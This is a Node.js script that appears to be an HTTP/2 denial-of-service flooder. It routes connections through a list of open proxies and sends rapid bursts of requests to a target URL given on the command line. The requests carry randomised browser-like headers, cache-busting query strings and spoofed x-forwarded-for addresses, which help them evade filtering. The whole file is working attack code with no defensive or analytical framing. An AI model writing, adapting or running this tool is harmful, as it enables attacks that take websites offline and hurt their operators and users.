const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
    process.exit(1);
}

function readLines(filePath) {
    if (!fs.existsSync(filePath)) process.exit(1);
    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
    if (!lines.length) process.exit(1);
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) process.exit(1);

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0"
];

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*"
];
const lang_header = [
    "en-US,en;q=0.9",
    "vi-VN,vi;q=0.9,en-US;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8"
];
const encoding_header = ["gzip, deflate, br"];
const sec_fetch_headers = {
    "sec-fetch-dest": ["document", "empty", "script"],
    "sec-fetch-mode": ["navigate", "cors", "no-cors"],
    "sec-fetch-site": ["same-origin", "cross-site"]
};
const cache_control = ["no-cache", "no-store"];
const referers = [
    `https://${parsedTarget.host}/`,
    "https://www.google.com/",
    ""
];
const platforms = ["Windows", "Macintosh", "iPhone", "Android"];
const sec_ch_ua = [
    '"Google Chrome";v="127", "Chromium";v="127", "Not.A/Brand";v="99"',
    '"Firefox";v="129"',
    '"Safari";v="18"'
];

const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
].join(":");

const proxies = readLines(args.proxyFile);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlooder, 100);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "invalid proxy response");
            }
            return callback(connection);
        });

        connection.on("timeout", () => {
            connection.destroy();
            callback(undefined, "timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            callback(undefined, "error");
        });
    }
}

const Socker = new NetSocket();

function generateDynamicPath() {
    const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
    const queries = [
        `q=${randstr(6)}`,
        `id=${randstr(4)}`,
        `p=${randomIntn(1, 50)}`,
        `t=${randstr(8)}`
    ];
    return `${basePath}?${randomElement(queries)}`;
}

function generateDynamicHeaders() {
    return {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":path": generateDynamicPath(),
        ":scheme": "https",
        "user-agent": randomElement(userAgents),
        "accept": randomElement(accept_header),
        "accept-language": randomElement(lang_header),
        "accept-encoding": randomElement(encoding_header),
        "sec-fetch-dest": randomElement(sec_fetch_headers["sec-fetch-dest"]),
        "sec-fetch-mode": randomElement(sec_fetch_headers["sec-fetch-mode"]),
        "sec-fetch-site": randomElement(sec_fetch_headers["sec-fetch-site"]),
        "sec-ch-ua": randomElement(sec_ch_ua),
        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
        "sec-ch-ua-platform": randomElement(platforms),
        "cache-control": randomElement(cache_control),
        "referer": randomElement(referers),
        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`
    };
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    if (!parsedProxy[0] || !parsedProxy[1]) return setTimeout(runFlooder, 1000);

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: parsedTarget.host + ":443",
        timeout: 5
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection) connection.destroy();
            return setTimeout(runFlooder, 1000);
        }

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            ciphers: ciphers,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3'
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 100,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = generateDynamicHeaders();
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.on("error", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 80);
            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, 1000);
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, 1000);
        });
    });
}
